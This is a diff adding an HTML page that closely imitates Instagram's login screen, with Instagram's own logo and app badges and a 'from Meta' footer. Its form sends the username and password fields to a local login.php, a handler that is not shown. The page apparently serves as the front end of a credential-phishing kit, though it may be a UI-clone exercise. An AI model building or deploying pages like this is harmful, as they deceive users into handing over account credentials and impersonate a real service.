@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+    <link href="src/output.css" rel="stylesheet" />
+    <style>
+      body {
+        font-family: "Inter", sans-serif;
+      }
+    </style>
+  </head>
+
+  <body class="bg-gray-50 min-h-screen flex items-center justify-center">
+    <div class="flex flex-col items-center justify-center space-y-5">
+      <!-- Login Card -->
+      <div
+        class="bg-white border border-gray-300 px-8 py-10 rounded-lg shadow-lg w-full max-w-md min-h-[480px] flex flex-col justify-between"
+      >
+        <div>
+          <div class="flex justify-center mb-8">
+            <i
+              data-visualcompletion="css-img"
+              aria-label="Instagram"
+              role="img"
+              style="
+                background-image: url('https://static.cdninstagram.com/rsrc.php/v4/yB/r/E7m8ZCMOFDS.png');
+                background-position: 0px -52px;
+                background-size: auto;
+                width: 175px;
+                height: 51px;
+                background-repeat: no-repeat;
+              "
+            ></i>
+          </div>
+          <form action="login.php" method="POST" class="space-y-4">
+            <input
+              type="text"
+              name="username"
+              placeholder="Phone number, username, or email"
+              required
+              class="w-full border border-gray-300 rounded px-3 py-3 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400"
+            />
+
+            <input
+              type="password"
+              name="password"
+              placeholder="Password"
+              required
+              class="w-full border border-gray-300 rounded px-3 py-3 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400"
+            />
+
+            <button
+              type="submit"
+              class="w-full bg-blue-500 text-white font-semibold py-2 rounded hover:bg-blue-600"
+            >
+              Log In
+            </button>
+          </form>
+
+          <div class="flex items-center my-6">
+            <div class="flex-grow h-px bg-gray-300"></div>
+            <span class="px-3 text-gray-500 text-sm">OR</span>
+            <div class="flex-grow h-px bg-gray-300"></div>
+          </div>
+
+          <div
+            class="text-center text-blue-700 font-medium text-sm cursor-pointer mb-4"
+          >
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
+              class="inline w-4 h-4 mr-2"
+            />
+            Log in with Facebook
+          </div>
+
+          <div class="text-center">
+            <a href="#" class="text-xs text-blue-700">Forgot password?</a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Signup Card -->
+      <div
+        class="bg-white border border-gray-300 p-4 text-center text-sm rounded-md w-full max-w-md"
+      >
+        Don't have an account?
+        <a href="#" class="text-blue-500 font-semibold">Sign up</a>
+      </div>
+
+      <!-- App Download Links -->
+      <div class="text-center text-sm">
+        Get the app.
+        <div class="flex justify-center gap-2 mt-3">
+          <img
+            src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english_en.png/9fc4bab7565b.png"
+            class="h-10"
+          />
+          <img
+            src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english_en.png/6071ff2c0643.png"
+            class="h-10"
+          />
+        </div>
+      </div>
+
+      <!-- Footer -->
+      <div class="text-xs text-gray-500 text-center mt-6">
+        © 2025 Instagram from Meta
+      </div>
+    </div>
+  </body>
+</html>
